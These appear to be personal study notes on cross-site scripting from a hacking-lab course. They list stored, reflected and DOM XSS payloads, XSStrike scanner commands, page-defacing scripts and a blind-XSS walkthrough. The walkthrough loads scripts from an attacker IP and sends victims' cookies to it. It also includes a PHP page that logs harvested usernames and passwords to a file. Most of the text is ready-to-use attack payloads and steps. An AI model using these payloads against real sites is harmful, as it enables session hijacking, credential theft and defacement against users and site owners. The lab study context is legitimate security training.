Not only HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent !!!!

**Stored & Reflected XSS***********
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script> 

**DOM Attacks****************
The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. 
Some of the commonly used JavaScript functions to write to DOM objects are:

    document.write()
    DOM.innerHTML
    DOM.outerHTML
Furthermore, some of the jQuery library functions that write to DOM objects are:

    add()
    after()
    append()

"></style></script><script>alert('Vulnerable')</script>"
"></style></script><script>alert('document.cookie')</script>"
!@#$<XSSTEST>[]()'"
<img src='x:x' onerror=alert(42)>
<img src="" onerror=alert(window.origin)>
<img src="" onerror=alert(document.cookie)>

**Discovery XSS:**
https://github.com/s0md3v/XSStrike
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
python xsstrike.py -u  "http://94.237.58.211:36183/?fullname=pera&username=peric&password=pera&email=pera%40example.com"

https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list - good list!!!

**Defacing**:
Three HTML elements are usually utilized to change the main look of a web page:

    Background Color document.body.style.background
    Background document.body.background
    Page Title document.title
    Page Text DOM.innerHTML

<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-example.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
document.getElementById("todo").innerHTML = "New Text"
JQuery - $("#todo").html('New Text');
document.getElementsByTagName('body')[0].innerHTML = "New Text"
<script>document.getElementById('urlform').remove();</script> 	= Remove certain HTML element
<script src="http://OUR_IP/script.js"></script>   = 	Load remote script
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>  = Send Cookie details to us

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Hack</h1><p style="color: white">by <img src="https://academy.example.com/images/logo-example.svg" height="25px" alt="Example Text"> </p></center>'</script>
-------------------------------------Phishing ----------------------------------------



-----------------------------------Session Hijacking/Cookie stealing---------------------------------------
Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

    Contact Forms
    Reviews
    User Details
    Support Tickets
    HTTP User-Agent header

1. try in each field in form:
"><script src=http://10.10.16.16:3333/></script>
"><script src=http://10.10.16.16:3333/></script>
"><script src=http://10.10.16.16:3333/></script>
"><script src=http://10.10.16.16:3333/></script>
2. But before configure index.php in /tmp/server:
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
3. First we got 200 response!!
4.  Next fill out form with each URI 
"><script src=http://10.10.16.16:3333/fullname></script>
"><script src=http://10.10.16.16:3333/username></script>
"><script src=http://10.10.16.16:3333/password></script>
"><script src=http://10.10.16.16:3333/url></script>
5. we are getting [200]: GET /url , so URL is vulnerable
6. Create the following script to steal the cookie.
nano script.js
new Image().src='http://10.10.16.16:3333/index.php?c='+document.cookie;
7. Put in vulnerable URL field in form :
"><script src=http://10.10.16.16:3333/script.js></script>
and BOOM we got cookie on our server

